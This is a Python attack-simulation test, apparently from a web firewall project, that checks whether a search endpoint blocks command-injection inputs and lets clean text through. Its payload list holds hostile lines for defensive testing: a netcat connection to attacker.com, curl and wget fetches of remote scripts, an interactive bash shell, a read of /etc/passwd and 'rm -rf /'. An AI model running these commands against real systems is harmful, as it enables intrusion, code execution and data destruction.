"""
SentinelGate Attack Simulation — Command Injection (A03:2021)
=============================================================
Demonstrates detection and blocking of OS command chaining operators,
backtick substitutions, subshell executions, and reverse shell triggers.

Usage:
    python -m backend.tests.attack_simulations.simulate_cmd_injection
"""
from __future__ import annotations

import sys
import httpx

from backend.tests.attack_simulations.common import (
    DEFAULT_TARGET_URL,
    get_auth_token,
    print_banner,
    print_test_result,
    GREEN,
    RED,
    CYAN,
    BOLD,
    RESET,
)

CLEAN_INPUTS = [
    "ping time 300ms",
    "use | as separator in CSV",
    "status report && executive summary",
    "normal command description text",
]

CMD_INJECTION_PAYLOADS = [
    "; whoami",
    "&& cat /etc/passwd",
    "| nc attacker.com 4444",
    "`id`",
    "$(curl http://evil.com)",
    "; id",
    "& uname -a",
    "| bash -i",
    "$(wget http://malicious.org/shell.sh)",
    "test; rm -rf /",
]


def run(target_url: str = DEFAULT_TARGET_URL) -> bool:
    print_banner("Command Injection Attack Simulation", f"Target: {target_url}/api/search")
    token = get_auth_token(target_url)
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "SentinelGate-Simulation-Agent/1.0",
    }

    all_passed = True
    test_idx = 1

    with httpx.Client(base_url=target_url, timeout=10.0) as client:
        # Phase 1: Legitimate query inputs (Expect ALLOW -> HTTP 200)
        print(f"{BOLD}{CYAN}[+] Stage 1: Legitimate Baseline Traffic (Expected: 200 ALLOW){RESET}")
        for clean_text in CLEAN_INPUTS:
            try:
                resp = client.get("/api/search", params={"q": clean_text}, headers=headers)
                passed = resp.status_code == 200
                risk_score = resp.headers.get("X-Risk-Score", "0")
                risk_level = resp.headers.get("X-Risk-Level", "LOW")
                if not passed:
                    all_passed = False
                print_test_result(
                    index=test_idx,
                    name=f"Clean: '{clean_text[:24]}'",
                    status_code=resp.status_code,
                    expected_status=200,
                    risk_score=int(risk_score) if risk_score.isdigit() else 0,
                    risk_level=risk_level,
                    passed=passed,
                )
            except Exception as e:
                all_passed = False
                print(f"  {RED}[✗ FAIL]{RESET} #{test_idx:02d} Connection error: {e}")
            test_idx += 1

        print()

        # Phase 2: Malicious Command Injection Payloads (Expect BLOCK -> HTTP 403)
        print(f"{BOLD}{CYAN}[+] Stage 2: OS Command Injection Attack Payloads (Expected: 403 BLOCK){RESET}")
        for payload in CMD_INJECTION_PAYLOADS:
            try:
                resp = client.get("/api/search", params={"cmd": payload}, headers=headers)
                passed = resp.status_code == 403
                threats: list[str] = []
                risk_score = None
                risk_level = None

                if resp.status_code == 403:
                    try:
                        data = resp.json()
                        threats = data.get("threats", [])
                        risk_score = data.get("risk_score")
                        risk_level = data.get("risk_level")
                    except Exception:
                        pass
                else:
                    all_passed = False

                print_test_result(
                    index=test_idx,
                    name=f"CmdInject: '{payload[:24]}'",
                    status_code=resp.status_code,
                    expected_status=403,
                    risk_score=risk_score,
                    risk_level=risk_level,
                    threats=threats,
                    passed=passed,
                )
            except Exception as e:
                all_passed = False
                print(f"  {RED}[✗ FAIL]{RESET} #{test_idx:02d} Connection error: {e}")
            test_idx += 1

    print(f"\n{BOLD}Result:{RESET} " + (f"{GREEN}ALL COMMAND INJECTION TESTS PASSED [100% Intercepted]{RESET}" if all_passed else f"{RED}SOME COMMAND INJECTION TESTS FAILED{RESET}"))
    return all_passed


if __name__ == "__main__":
    success = run()
    sys.exit(0 if success else 1)
